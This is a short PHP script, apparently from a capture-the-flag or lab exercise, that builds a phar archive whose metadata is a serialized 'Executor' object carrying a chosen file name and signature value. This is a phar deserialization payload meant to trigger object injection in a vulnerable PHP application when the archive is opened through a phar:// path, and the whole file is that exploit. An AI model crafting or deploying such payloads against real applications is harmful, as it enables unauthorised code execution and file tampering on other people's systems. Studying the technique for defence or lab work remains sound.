<?php
	$phar = new Phar('my.phar');
	$phar->startBuffering();
	$phar->addFromString('test.txt', 'text');
	$phar->setStub('<?php __HALT_COMPILER(); ?>');


	class Executor {
		private $filename = 'my.php'; 
        private $signature = 'd9dca0c068f8511f02ab559e1343ec30';
	}
	
	$obj = new Executor();
	$phar->setMetadata($obj);
	$phar->stopBuffering();
?>